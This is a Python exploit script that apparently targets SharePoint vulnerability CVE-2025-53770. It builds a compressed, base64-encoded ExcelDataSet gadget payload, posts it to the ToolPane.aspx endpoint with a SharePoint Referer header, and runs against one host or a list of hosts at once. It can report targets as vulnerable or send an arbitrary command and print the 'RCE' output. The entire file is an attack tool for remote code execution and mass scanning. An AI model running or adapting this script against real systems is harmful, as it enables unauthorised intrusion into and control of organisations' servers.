import asyncio,aiohttp,base64,zlib,re,sys,os # type: ignore
__AUTHOR__ = "J4ck3LSyN"
# NOTE: This is a simplified PoC for CVE-2025-53770. In a real-world scenario, the gadget XML would be more complex and tailored to the specific SharePoint version and configuration. The payload generation logic can be expanded to include more sophisticated gadgets or obfuscation techniques as needed. 
# Lab metadata for verification mode
checkStr="Sharepoint_CVE-2025-53770_Validator"
def buildPayload(cmd=None):
    xmlGadget = f"""<root><cmd>{cmd if cmd else checkStr}</cmd></root>"""
    compressor = zlib.compressobj(9, zlib.DEFLATED, 31)
    compressed = compressor.compress(xmlGadget.encode()) + compressor.flush()
    b64Payload = base64.b64encode(compressed).decode()
    return f"""<asp:UpdateProgress ID="up" runat="server"><ProgressTemplate>
<Scorecard:ExcelDataSet CompressedDataTable="{b64Payload}" Command="{cmd if cmd else ''}" runat="server" />
</ProgressTemplate></asp:UpdateProgress>"""

async def runTask(session,target,cmd):
    if not target.startswith("http"): target = f"http://{target}"
    # SharePoint endpoint for Web Part maintenance
    vulnUrl = f"{target.rstrip('/')}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
    reqHeaders = {
        "Referer": f"{target}/_layouts/15/",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) OpSec/2.0"}
    postData = {
        "MSOTlPn_Uri": target,
        "MSOTlPn_DWP": buildPayload(cmd)}
    try:
        async with session.post(vulnUrl, headers=reqHeaders, data=postData, ssl=False, timeout=10) as response:
            resBody = await response.text()
            if not cmd:
                match = re.search(r'CompressedDataTable=&quot;([^&]+)', resBody)
                if match and (checkStr in resBody or "VANDA_TEST" in resBody): print(f"[!] VULNERABLE: {target}");return
                print(f"[-] SAFE: {target}")
            else:
                if "[RCE_OUTPUT]" in resBody: output = resBody.split("[RCE_OUTPUT]:")[-1].split("</body>")[0].strip();print(f"[+] RCE SUCCESS [{target}]:\n{output}")
                else: print(f"[*] TASK SENT: {target} (HTTP {response.status})")
    except Exception as e: print(f"[?] ERROR: {target} -> Exception:`{str(e)}`")

async def main():
    if len(sys.argv) < 2: print("Usage: python3 sploit.py <target|list.txt> <cmd?>"); sys.exit(1)
    rawInput, command = sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None
    targets = [rawInput] if not os.path.isfile(rawInput) else [l.strip() for l in open(rawInput) if l.strip()]
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[runTask(session, t, command) for t in targets])

if __name__ == "__main__": asyncio.run(main())
